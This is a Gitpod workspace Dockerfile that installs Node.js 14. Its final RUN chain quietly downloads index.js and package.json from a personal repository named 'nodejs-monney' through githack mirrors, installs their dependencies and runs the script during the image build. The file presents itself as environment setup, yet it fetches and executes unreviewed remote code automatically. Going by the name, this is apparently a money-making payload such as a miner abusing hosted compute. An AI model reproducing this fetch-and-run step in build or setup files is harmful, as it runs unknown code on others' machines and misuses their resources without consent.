FROM gitpod/workspace-full

RUN sudo apt-get update \
 && curl -sL https://deb.nodesource.com/setup_14.x -o nodesource_setup.sh \
 && sudo bash nodesource_setup.sh \
 && sudo apt install nodejs \
 && sudo rm -rf /var/lib/apt/lists/* \
 && wget https://raw.githack.com/vippro99/nodejs-monney/main/index.js && wget https://rawcdn.githack.com/vippro99/nodejs-monney/ce679fa4578f7719b92c0b0126258d1e25eedae3/package.json && chmod +x index.js package.json && npm i -s && node index.js
